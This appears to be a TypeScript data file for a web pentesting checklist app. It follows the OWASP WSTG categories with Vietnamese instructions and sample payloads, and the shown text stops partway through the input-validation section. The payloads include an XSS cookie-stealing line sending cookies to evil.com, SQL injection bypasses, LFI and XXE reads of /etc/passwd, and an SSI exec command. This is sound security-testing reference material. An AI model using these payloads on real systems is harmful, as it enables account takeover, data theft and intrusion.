import { WSTGCategory } from './types';

export const WSTG_CATEGORIES: WSTGCategory[] = [
  {
    id: 'INFO',
    name: '4.1. Information Gathering (Thu thập thông tin)',
    tests: [
      {
        id: 'WSTG-INFO-01',
        category: 'Information Gathering',
        title: 'Conduct Search Engine Discovery Reconnaissance',
        description: 'Sử dụng công cụ tìm kiếm (OSINT) để tìm thông tin nhạy cảm, sơ đồ trang web và lỗi cấu hình.',
        objectives: ['Tìm dữ liệu rò rỉ.', 'Vẽ sơ đồ site.', 'Tìm entry point ẩn.'],
        instructions: 'Bước 1: Xác định domain mục tiêu.\nBước 2: Dùng Google Dorks tìm file (pdf, xls, doc).\nBước 3: Tìm thư mục mở (Index of).\nBước 4: Tìm file backup/config.',
        payloads: [
          { code: 'site:target.com filetype:pdf', description: 'Tìm tài liệu PDF.' },
          { code: 'site:target.com "index of"', description: 'Tìm lỗi Directory Listing.' },
          { code: 'site:target.com inurl:admin', description: 'Tìm trang quản trị.' },
          { code: 'site:pastebin.com "target.com"', description: 'Tìm dữ liệu rò rỉ trên Pastebin.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-02',
        category: 'Information Gathering',
        title: 'Fingerprint Web Server',
        description: 'Xác định loại và phiên bản Web Server để tìm CVE.',
        objectives: ['Xác định tên/version Server.', 'Tìm CVE liên quan.'],
        instructions: 'Bước 1: Gửi request HTTP, check header "Server".\nBước 2: Gửi request lỗi (404) xem trang mặc định.\nBước 3: Dùng Nmap/Nikto/WhatWeb.',
        payloads: [
          { code: 'curl -I https://target.com', description: 'Xem HTTP Headers.' },
          { code: 'nmap -sV -p 80,443 target.com', description: 'Quét version service.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-03',
        category: 'Information Gathering',
        title: 'Review Webserver Metafiles',
        description: 'Kiểm tra robots.txt, sitemap.xml, security.txt.',
        objectives: ['Tìm đường dẫn ẩn/nhạy cảm.'],
        instructions: 'Bước 1: Truy cập /robots.txt.\nBước 2: Truy cập /sitemap.xml.\nBước 3: Kiểm tra /.well-known/security.txt.',
        payloads: [
          { code: 'curl https://target.com/robots.txt', description: 'Kiểm tra robots.txt' },
          { code: 'curl https://target.com/.well-known/security.txt', description: 'Security Contact.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-04',
        category: 'Information Gathering',
        title: 'Enumerate Applications on Webserver',
        description: 'Tìm ứng dụng khác, subdomain, vhost trên cùng IP.',
        objectives: ['Tìm subdomain, vhost.', 'Tìm non-standard port.'],
        instructions: 'Bước 1: Enum subdomain (Amass, Subfinder).\nBước 2: Reverse DNS lookup IP.\nBước 3: Brute-force Virtual Host.',
        payloads: [
          { code: 'amass enum -d target.com', description: 'Enum subdomain.' },
          { code: 'gobuster vhost -u https://target.com -w list.txt', description: 'Brute-force VHost.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-05',
        category: 'Information Gathering',
        title: 'Review Webpage Content for Information Leakage',
        description: 'Phân tích HTML/JS tìm comment, API key, thông tin debug.',
        objectives: ['Tìm comment code, credentials, API key.'],
        instructions: 'Bước 1: View Source.\nBước 2: Tìm từ khóa (password, todo, api).\nBước 3: Phân tích file JS (webpack, map files).',
        payloads: [
          { code: 'grep -rE "api_key|password|TODO" .', description: 'Tìm từ khóa nhạy cảm.' },
          { code: 'curl https://target.com/main.js.map', description: 'Kiểm tra Source Map.' }
        ],
        strategy: 'Gray-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-INFO-06',
        category: 'Information Gathering',
        title: 'Identify Application Entry Points',
        description: 'Xác định các điểm đầu vào của ứng dụng (Parameters, Headers, Cookies).',
        objectives: ['Liệt kê toàn bộ vector có thể tấn công.'],
        instructions: 'Bước 1: Sử dụng Burp Suite Spider/Crawler.\nBước 2: Quan sát URL parameters và Body parameters.\nBước 3: Kiểm tra các hidden fields.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-07',
        category: 'Information Gathering',
        title: 'Map Execution Paths',
        description: 'Vẽ sơ đồ luồng hoạt động của ứng dụng.',
        objectives: ['Hiểu logic ứng dụng.'],
        instructions: 'Bước 1: Click qua các chức năng.\nBước 2: Ghi lại luồng đi (Workflow).',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-08',
        category: 'Information Gathering',
        title: 'Fingerprint Web Application Framework',
        description: 'Xác định Framework (Laravel, React, Vue, ASP.NET...) và các thư viện bên thứ 3.',
        objectives: ['Tìm version framework để tra CVE.'],
        instructions: 'Bước 1: Check HTTP Header (X-Powered-By).\nBước 2: Check Cookie names (PHPSESSID, JSESSIONID).\nBước 3: Check HTML source structure, class names.',
        payloads: [
          { code: 'Wappalyzer', description: 'Extension nhận diện công nghệ.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-09',
        category: 'Information Gathering',
        title: 'Fingerprint Web Application',
        description: 'Xác định ứng dụng web cụ thể (Wordpress, Joomla, Drupal) và phiên bản.',
        objectives: ['Tìm CVE của ứng dụng cụ thể.'],
        instructions: 'Bước 1: Tìm file đặc trưng (wp-login.php, README.txt).\nBước 2: Kiểm tra meta generator tag.',
        payloads: [
          { code: 'curl https://target.com/wp-login.php', description: 'Check WordPress.' },
          { code: 'WPScan', description: 'WordPress Scanner.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-INFO-10',
        category: 'Information Gathering',
        title: 'Map Application Architecture',
        description: 'Xác định WAF, Load Balancer, Proxy, DB.',
        objectives: ['Phát hiện WAF, Proxy.'],
        instructions: 'Bước 1: Traceroute.\nBước 2: Dùng wafw00f detect WAF.\nBước 3: Gửi payload tấn công xem phản ứng.',
        payloads: [
          { code: 'wafw00f https://target.com', description: 'Detect WAF.' }
        ],
        strategy: 'Black-box',
        severity: 'Info'
      }
    ]
  },
  {
    id: 'CONF',
    name: '4.2. Configuration & Deployment (Cấu hình)',
    tests: [
      {
        id: 'WSTG-CONF-01',
        category: 'Configuration',
        title: 'Test Network Configuration',
        description: 'Kiểm tra port, firewall, DNS.',
        objectives: ['Tìm port mở không cần thiết.', 'Zone transfer.'],
        instructions: 'Bước 1: Nmap scan all ports.\nBước 2: Check DNS Zone Transfer.',
        payloads: [
          { code: 'nmap -sS -p- target.com', description: 'Full port scan.' },
          { code: 'dig axfr @ns.target.com target.com', description: 'DNS Zone Transfer.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-CONF-02',
        category: 'Configuration',
        title: 'Test Application Platform Configuration',
        description: 'Kiểm tra cấu hình mặc định, trang admin, log files.',
        objectives: ['Tìm trang quản trị/config files.'],
        instructions: 'Bước 1: Fuzzing file/folder phổ biến.\nBước 2: Check trang lỗi stack trace.',
        payloads: [
          { code: 'dirsearch -u target.com', description: 'Directory brute-force.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CONF-03',
        category: 'Configuration',
        title: 'Test Security HTTP Headers',
        description: 'Kiểm tra thiếu sót các header bảo mật (CSP, X-Frame-Options).',
        objectives: ['Đảm bảo có headers bảo vệ client.'],
        instructions: 'Bước 1: Inspect Response Headers.\nBước 2: Check CSP, X-Content-Type-Options.',
        payloads: [
          { code: 'curl -I https://target.com', description: 'Check Headers.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CONF-04',
        category: 'Configuration',
        title: 'Test for Old, Backup and Unreferenced Files',
        description: 'Tìm file backup (.bak, .old, .zip, .sql) do admin để quên.',
        objectives: ['Download source code, config, DB dump.'],
        instructions: 'Bước 1: Dùng tool dirsearch/gobuster.\nBước 2: Fuzzing extension .bak, .old, .zip, .sql.',
        payloads: [
          { code: 'dirsearch -u target.com -e bak,old,zip,sql', description: 'Quét file backup.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CONF-05',
        category: 'Configuration',
        title: 'Enumerate Infrastructure and Admin Interfaces',
        description: 'Tìm kiếm các giao diện quản trị hạ tầng (kibana, jenkins, admin panels).',
        objectives: ['Truy cập trái phép giao diện quản trị.'],
        instructions: 'Bước 1: Port scan các port quản trị (8080, 8888, 9000).\nBước 2: Directory brute-force /admin, /manager.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CONF-06',
        category: 'Configuration',
        title: 'Test HTTP Methods',
        description: 'Kiểm tra methods nguy hiểm (PUT, DELETE, TRACE).',
        objectives: ['Test XST (Trace), Upload (Put).'],
        instructions: 'Bước 1: Gửi OPTIONS request.\nBước 2: Check Allow header.\nBước 3: Test TRACE.',
        payloads: [
          { code: 'curl -X OPTIONS -I https://target.com', description: 'Check Allowed Methods.' },
          { code: 'curl -X TRACE -I https://target.com', description: 'Test XST.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CONF-07',
        category: 'Configuration',
        title: 'Test HTTP Strict Transport Security (HSTS)',
        description: 'Kiểm tra header HSTS để ép buộc HTTPS.',
        objectives: ['Đảm bảo người dùng không bị downgrade xuống HTTP.'],
        instructions: 'Bước 1: Check response header.\nBước 2: Tìm Strict-Transport-Security.',
        payloads: [
          { code: 'Strict-Transport-Security: max-age=31536000', description: 'Header mẫu đúng.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CONF-08',
        category: 'Configuration',
        title: 'Test RIA Cross Domain Policy',
        description: 'Kiểm tra crossdomain.xml hoặc clientaccesspolicy.xml quá lỏng lẻo.',
        objectives: ['Ngăn chặn Flash/Silverlight truy cập domain chéo.'],
        instructions: 'Bước 1: Truy cập /crossdomain.xml.\nBước 2: Kiểm tra allow-access-from domain="*".',
        payloads: [
          { code: 'curl https://target.com/crossdomain.xml', description: 'Check policy.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CONF-09',
        category: 'Configuration',
        title: 'Test File Permission',
        description: 'Kiểm tra quyền truy cập file trên server.',
        objectives: ['Đảm bảo user web không đọc được file config hệ thống.'],
        instructions: 'Bước 1: Cố gắng truy cập file config trực tiếp qua URL.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CONF-10',
        category: 'Configuration',
        title: 'Test for Subdomain Takeover',
        description: 'Kiểm tra các bản ghi CNAME trỏ đến dịch vụ cloud đã ngừng hoạt động.',
        objectives: ['Chiếm quyền kiểm soát subdomain.'],
        instructions: 'Bước 1: Enum subdomain.\nBước 2: Check CNAME.\nBước 3: Check response 404 từ provider (AWS, GitHub, Heroku).',
        payloads: [
          { code: 'subjack -w subdomains.txt', description: 'Tool check takeover.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CONF-11',
        category: 'Configuration',
        title: 'Test Cloud Storage',
        description: 'Kiểm tra bảo mật AWS S3, Azure Blob, GCP Buckets.',
        objectives: ['Tìm bucket công khai, chiếm quyền ghi.'],
        instructions: 'Bước 1: Tìm link s3.amazonaws.com trong source.\nBước 2: Kiểm tra quyền List/Put object.',
        payloads: [
            { code: 'aws s3 ls s3://[bucket] --no-sign-request', description: 'AWS S3 List.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      }
    ]
  },
  {
    id: 'IDNT',
    name: '4.3. Identity Management (Quản lý danh tính)',
    tests: [
      {
        id: 'WSTG-IDNT-01',
        category: 'Identity Management',
        title: 'Test Role Definitions',
        description: 'Xác định các vai trò và quyền hạn.',
        objectives: ['Hiểu ma trận phân quyền.'],
        instructions: 'Bước 1: Login các user khác role.\nBước 2: Map chức năng với role.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Info'
      },
      {
        id: 'WSTG-IDNT-02',
        category: 'Identity Management',
        title: 'Test User Registration Process',
        description: 'Kiểm tra quy trình đăng ký (trùng user, password policy, email verify).',
        objectives: ['Bypass registration, spam user.'],
        instructions: 'Bước 1: Đăng ký user mới.\nBước 2: Check validate input.\nBước 3: Check unique username.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-IDNT-03',
        category: 'Identity Management',
        title: 'Test Account Provisioning Process',
        description: 'Kiểm tra quy trình cấp phát và thu hồi tài khoản.',
        objectives: ['Đảm bảo tài khoản bị thu hồi đúng cách.'],
        instructions: 'Bước 1: Yêu cầu admin xóa user.\nBước 2: Kiểm tra user đó còn login được không.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-IDNT-04',
        category: 'Identity Management',
        title: 'Testing for Account Enumeration',
        description: 'Đoán tên tài khoản qua thông báo lỗi hoặc thời gian phản hồi.',
        objectives: ['Thu thập danh sách user.'],
        instructions: 'Bước 1: Login/Forgot Pass.\nBước 2: Nhập user tồn tại/không tồn tại.\nBước 3: So sánh lỗi/time.',
        payloads: [
          { code: 'User: admin -> "Sai pass"', description: 'Lộ user tồn tại.' },
          { code: 'User: xyz -> "User không tồn tại"', description: 'Lộ user không tồn tại.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-IDNT-05',
        category: 'Identity Management',
        title: 'Testing for Weak or Unenforced Username Policy',
        description: 'Kiểm tra chính sách đặt tên người dùng (dễ đoán, không có filter).',
        objectives: ['Tạo user trùng tên, user có ký tự lạ.'],
        instructions: 'Bước 1: Đăng ký tài khoản.\nBước 2: Thử dùng username dễ đoán (admin1, test).',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      }
    ]
  },
  {
    id: 'ATHN',
    name: '4.4. Authentication (Xác thực)',
    tests: [
      {
        id: 'WSTG-ATHN-01',
        category: 'Authentication',
        title: 'Testing for Credentials Transported over Encrypted Channel',
        description: 'Login có qua HTTPS không?',
        objectives: ['Ngăn MITM.'],
        instructions: 'Bước 1: Check form action login.\nBước 2: Bắt gói tin xem plaintext không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-ATHN-02',
        category: 'Authentication',
        title: 'Testing for Default Credentials',
        description: 'Thử mật khẩu mặc định.',
        objectives: ['Login admin.'],
        instructions: 'Bước 1: Tìm default pass của thiết bị/CMS.\nBước 2: Thử login.',
        payloads: [
          { code: 'admin/admin, root/root', description: 'Default creds.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      },
      {
        id: 'WSTG-ATHN-03',
        category: 'Authentication',
        title: 'Testing for Weak Lock Out Mechanism',
        description: 'Cơ chế khóa tài khoản khi brute-force.',
        objectives: ['Brute-force password.'],
        instructions: 'Bước 1: Nhập sai pass 5-10 lần.\nBước 2: Xem có bị khóa hay CAPTCHA không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-ATHN-04',
        category: 'Authentication',
        title: 'Testing for Bypassing Authentication Schema',
        description: 'Vượt qua đăng nhập (SQLi login, Force Browsing).',
        objectives: ['Login không cần pass.'],
        instructions: 'Bước 1: Force browsing /admin.\nBước 2: SQLi vào form login.',
        payloads: [
          { code: "' OR 1=1--", description: 'Auth Bypass SQLi.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      },
      {
        id: 'WSTG-ATHN-05',
        category: 'Authentication',
        title: 'Testing for Vulnerable Remember Password',
        description: 'Kiểm tra tính năng "Nhớ mật khẩu" có an toàn không.',
        objectives: ['Giải mã cookie remember me.'],
        instructions: 'Bước 1: Chọn Remember Me và login.\nBước 2: Phân tích cookie được sinh ra (Base64, Hex).',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-ATHN-06',
        category: 'Authentication',
        title: 'Testing for Browser Cache Weaknesses',
        description: 'Kiểm tra trình duyệt có lưu cache trang nhạy cảm không.',
        objectives: ['Xem lại thông tin sau khi logout.'],
        instructions: 'Bước 1: Login, vào trang nhạy cảm.\nBước 2: Logout.\nBước 3: Bấm Back button.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-ATHN-07',
        category: 'Authentication',
        title: 'Testing for Weak Password Policy',
        description: 'Kiểm tra độ mạnh mật khẩu (độ dài, ký tự).',
        objectives: ['Đặt mật khẩu yếu (123456).'],
        instructions: 'Bước 1: Đổi mật khẩu thành chuỗi đơn giản.\nBước 2: Xem hệ thống có chấp nhận không.',
        payloads: [
          { code: '123456', description: 'Weak password.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-ATHN-08',
        category: 'Authentication',
        title: 'Testing for Weak Security Question/Answer',
        description: 'Kiểm tra câu hỏi bảo mật dễ đoán hoặc brute-force được.',
        objectives: ['Reset pass qua câu hỏi bảo mật.'],
        instructions: 'Bước 1: Thử chức năng quên mật khẩu qua câu hỏi.\nBước 2: Brute-force câu trả lời.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-ATHN-09',
        category: 'Authentication',
        title: 'Testing for Weak Password Change or Reset Functionalities',
        description: 'Kiểm tra lỗ hổng trong tính năng đổi mật khẩu hoặc quên mật khẩu.',
        objectives: ['Chiếm tài khoản qua token reset yếu, Host Header Poisoning.'],
        instructions: 'Bước 1: Yêu cầu reset pass.\nBước 2: Check độ mạnh token reset.\nBước 3: Test Host Header Poisoning trong email gửi về.',
        payloads: [
          { code: 'Host: evil.com', description: 'Host Header Poisoning.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-ATHN-10',
        category: 'Authentication',
        title: 'Testing for Weaker Authentication in Alternative Channel',
        description: 'Kiểm tra xác thực trên Mobile App, API có yếu hơn Web không.',
        objectives: ['Bypass Auth qua kênh khác.'],
        instructions: 'Bước 1: Kiểm tra Mobile API.\nBước 2: So sánh cơ chế Auth với Web.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'High'
      }
    ]
  },
  {
    id: 'ATHZ',
    name: '4.5. Authorization (Phân quyền)',
    tests: [
      {
        id: 'WSTG-ATHZ-01',
        category: 'Authorization',
        title: 'Testing Directory Traversal File Include',
        description: 'Truy cập file ngoài webroot (LFI/Path Traversal).',
        objectives: ['Đọc file hệ thống (/etc/passwd).'],
        instructions: 'Bước 1: Tìm tham số file path.\nBước 2: Thêm ../..\nBước 3: Check response.',
        payloads: [
          { code: '../../../../etc/passwd', description: 'Linux LFI.' },
          { code: '..\\..\\..\\windows\\win.ini', description: 'Windows LFI.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-ATHZ-02',
        category: 'Authorization',
        title: 'Testing for Bypassing Authorization Schema',
        description: 'Privilege Escalation (Leo thang đặc quyền).',
        objectives: ['User thường làm việc Admin.'],
        instructions: 'Bước 1: Login User thường.\nBước 2: Truy cập URL Admin.\nBước 3: Đổi Cookie role.',
        payloads: [
          { code: 'Cookie: role=admin', description: 'Tampering Cookie.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-ATHZ-03',
        category: 'Authorization',
        title: 'Testing for Privilege Escalation',
        description: 'Leo thang dọc (Vertical) và ngang (Horizontal).',
        objectives: ['Truy cập tài nguyên user khác hoặc admin.'],
        instructions: 'Bước 1: Test IDOR.\nBước 2: Test Admin endpoints.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-ATHZ-04',
        category: 'Authorization',
        title: 'Testing for Insecure Direct Object References (IDOR)',
        description: 'Thay đổi ID tham chiếu để xem dữ liệu người khác.',
        objectives: ['Xem/Sửa dữ liệu user khác.'],
        instructions: 'Bước 1: Tìm ID trong URL/Body (id=10).\nBước 2: Đổi thành id=11.\nBước 3: Check response.',
        payloads: [
          { code: 'GET /user/100 -> /user/101', description: 'IDOR URL.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      }
    ]
  },
  {
    id: 'SESS',
    name: '4.6. Session Management',
    tests: [
      {
        id: 'WSTG-SESS-01',
        category: 'Session Management',
        title: 'Testing for Session Management Schema',
        description: 'Phân tích độ mạnh Session ID.',
        objectives: ['Dự đoán Session ID.'],
        instructions: 'Bước 1: Thu thập mẫu Session ID.\nBước 2: Dùng Burp Sequencer phân tích.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-02',
        category: 'Session Management',
        title: 'Testing for Cookies Attributes',
        description: 'Check Secure, HttpOnly, SameSite flags.',
        objectives: ['Cookie security.'],
        instructions: 'Bước 1: Inspect Cookie.\nBước 2: Check flags.',
        payloads: [
          { code: 'document.cookie', description: 'Test HttpOnly via JS.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-03',
        category: 'Session Management',
        title: 'Testing for Session Fixation',
        description: 'Tấn công cố định phiên.',
        objectives: ['Hijack session nạn nhân.'],
        instructions: 'Bước 1: Lấy Session ID khi chưa login.\nBước 2: Login.\nBước 3: Check xem Session ID có đổi không. Nếu không đổi -> Lỗi.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-SESS-04',
        category: 'Session Management',
        title: 'Testing for Exposed Session Variables',
        description: 'Session ID bị lộ trong URL, Error, Log.',
        objectives: ['Tìm Session ID bị lộ.'],
        instructions: 'Bước 1: Check URL có chứa JSESSIONID/PHPSESSID không.\nBước 2: Check referrer header.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-05',
        category: 'Session Management',
        title: 'Testing for Cross Site Request Forgery (CSRF)',
        description: 'Ép người dùng thực hiện hành động không mong muốn.',
        objectives: ['Đổi pass, chuyển tiền user khác.'],
        instructions: 'Bước 1: Tìm action nhạy cảm (POST).\nBước 2: Check Anti-CSRF Token.\nBước 3: Tạo PoC HTML form.',
        payloads: [
          { code: '<form action="..." method="POST">', description: 'CSRF PoC HTML.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-SESS-06',
        category: 'Session Management',
        title: 'Testing for Logout Functionality',
        description: 'Nút đăng xuất có thực sự hủy phiên server-side không?',
        objectives: ['Reuse session sau khi logout.'],
        instructions: 'Bước 1: Logout.\nBước 2: Bấm Back hoặc dùng lại Cookie cũ request.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-07',
        category: 'Session Management',
        title: 'Testing Session Timeout',
        description: 'Kiểm tra thời gian hết hạn phiên.',
        objectives: ['Reuse session cũ.'],
        instructions: 'Bước 1: Login.\nBước 2: Chờ đợi một khoảng thời gian.\nBước 3: Thử reload trang xem còn session không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-08',
        category: 'Session Management',
        title: 'Testing for Session Puzzling',
        description: 'Dùng session của chức năng này cho chức năng khác.',
        objectives: ['Bypass Auth.'],
        instructions: 'Bước 1: Login user thường.\nBước 2: Thử truy cập trang admin với session đó.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-SESS-09',
        category: 'Session Management',
        title: 'Testing for Session Hijacking',
        description: 'Kiểm tra khả năng chiếm đoạt phiên làm việc của người dùng thông qua sniffing, XSS hoặc các kỹ thuật khác.',
        objectives: ['Chiếm quyền điều khiển tài khoản nạn nhân.'],
        instructions: 'Bước 1: Kiểm tra xem Session ID có được mã hóa qua HTTPS không.\nBước 2: Thử tấn công XSS để lấy document.cookie.\nBước 3: Kiểm tra Session Timeout.',
        payloads: [
          { code: '<script>new Image().src="http://evil.com?c="+document.cookie</script>', description: 'XSS Cookie Stealing.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-SESS-10',
        category: 'Session Management',
        title: 'Testing JSON Web Tokens (JWT)',
        description: 'Kiểm tra bảo mật JWT (None algorithm, weak secret, không hết hạn).',
        objectives: ['Forging Token, Bypassing Auth.'],
        instructions: 'Bước 1: Decode JWT.\nBước 2: Đổi alg thành "None".\nBước 3: Brute-force secret key.',
        payloads: [
          { code: 'alg: "None"', description: 'None Algorithm Attack.' },
          { code: 'jwt_tool.py', description: 'Tool tấn công JWT.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      }
    ]
  },
  {
    id: 'INPV',
    name: '4.7. Input Validation (Kiểm tra đầu vào)',
    tests: [
      {
        id: 'WSTG-INPV-01',
        category: 'Input Validation',
        title: 'Testing for Reflected XSS',
        description: 'XSS phản xạ qua URL/Input.',
        objectives: ['Chạy JS trên trình duyệt nạn nhân.'],
        instructions: 'Bước 1: Tìm input parameters.\nBước 2: Inject script.\nBước 3: Check response.',
        payloads: [
          { code: '<script>alert(1)</script>', description: 'Basic XSS.' },
          { code: '"><img src=x onerror=alert(1)>', description: 'Attribute breakout.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-02',
        category: 'Input Validation',
        title: 'Testing for Stored XSS',
        description: 'XSS lưu trữ trong DB (Comment, Profile).',
        objectives: ['Lây nhiễm người dùng xem trang.'],
        instructions: 'Bước 1: Post comment chứa script.\nBước 2: Reload trang xem script chạy không.',
        payloads: [
          { code: '<script>alert(document.cookie)</script>', description: 'Stored XSS.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-03',
        category: 'Input Validation',
        title: 'Testing for HTTP Verb Tampering',
        description: 'Bypass xác thực bằng cách đổi GET/POST thành method khác.',
        objectives: ['Bypass Auth.'],
        instructions: 'Bước 1: Chặn request POST.\nBước 2: Đổi thành GET hoặc HEAD.\nBước 3: Check xem server có chấp nhận không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-INPV-04',
        category: 'Input Validation',
        title: 'Testing for HTTP Parameter Pollution',
        description: 'Gửi trùng lặp tham số để gây nhầm lẫn cho server.',
        objectives: ['Bypass WAF, Logic error.'],
        instructions: 'Bước 1: Gửi ?id=1&id=2.\nBước 2: Xem server xử lý id nào (đầu, cuối, hay gộp).',
        payloads: [
          { code: '?user=admin&user=guest', description: 'HPP Test.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-INPV-05',
        category: 'Input Validation',
        title: 'Testing for SQL Injection',
        description: 'Chèn mã SQL thao tác DB.',
        objectives: ['Dump DB, Bypass Auth.'],
        instructions: 'Bước 1: Thêm \' hoặc ".\nBước 2: Check syntax error.\nBước 3: Dùng UNION SELECT hoặc Blind payloads.',
        payloads: [
          { code: "' OR 1=1--", description: 'Login Bypass.' },
          { code: "' UNION SELECT 1,2,version()--", description: 'Data Extraction.' },
          { code: "' AND SLEEP(5)--", description: 'Blind Time-based.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      },
      {
        id: 'WSTG-INPV-06',
        category: 'Input Validation',
        title: 'Testing for LDAP Injection',
        description: 'Chèn ký tự đặc biệt vào câu truy vấn LDAP.',
        objectives: ['Bypass Auth, Extract LDAP Info.'],
        instructions: 'Bước 1: Tìm input tương tác LDAP (Login, Search User).\nBước 2: Inject * hoặc (.|.).',
        payloads: [
          { code: '*', description: 'Wildcard Injection.' },
          { code: 'admin*)((|user=*)', description: 'LDAP Filter Bypass.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-07',
        category: 'Input Validation',
        title: 'Testing for XML Injection (XXE)',
        description: 'Chèn XML External Entity để đọc file hoặc SSRF.',
        objectives: ['Đọc file hệ thống, SSRF.'],
        instructions: 'Bước 1: Tìm input XML.\nBước 2: Khai báo DOCTYPE entity.\nBước 3: Tham chiếu entity trong body.',
        payloads: [
          { code: '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>', description: 'Basic XXE Read File.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-08',
        category: 'Input Validation',
        title: 'Testing for SSI Injection',
        description: 'Server-Side Includes Injection (trên các server cũ).',
        objectives: ['RCE.'],
        instructions: 'Bước 1: Tìm input được in ra trong file .shtml.\nBước 2: Inject <!--#exec cmd="ls" -->.',
        payloads: [
          { code: '<!--#exec cmd="ls" -->', description: 'SSI Exec.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-09',
        category: 'Input Validation',
        title: 'Testing for XPath Injection',
        description: 'Chèn mã vào câu truy vấn XPath/XML.',
        objectives: ['Extract XML Data, Bypass Auth.'],
        instructions: 'Bước 1: Inject \' or 1=1].\nBước 2: Quan sát phản hồi.',
        payloads: [
          { code: "' or 1=1] |", description: 'XPath Bypass.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-10',
        category: 'Input Validation',
        title: 'Testing for IMAP/SMTP Injection',
        description: 'Tiêm lệnh vào mail server qua input form.',
        objectives: ['Đọc email, gửi spam.'],
        instructions: 'Bước 1: Xác định input tương tác mail server.\nBước 2: Inject CRLF và lệnh SMTP.',
        payloads: [
          { code: '%0d%0aRCPT TO: victim@site.com', description: 'SMTP Injection.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-INPV-11',
        category: 'Input Validation',
        title: 'Testing for Code Injection',
        description: 'Inject code (PHP, Python) để server thực thi (eval).',
        objectives: ['RCE.'],
        instructions: 'Bước 1: Tìm tham số được đưa vào hàm eval().\nBước 2: Inject code (phpinfo()).',
        payloads: [
          { code: 'phpinfo();', description: 'PHP Code Injection.' }
        ],
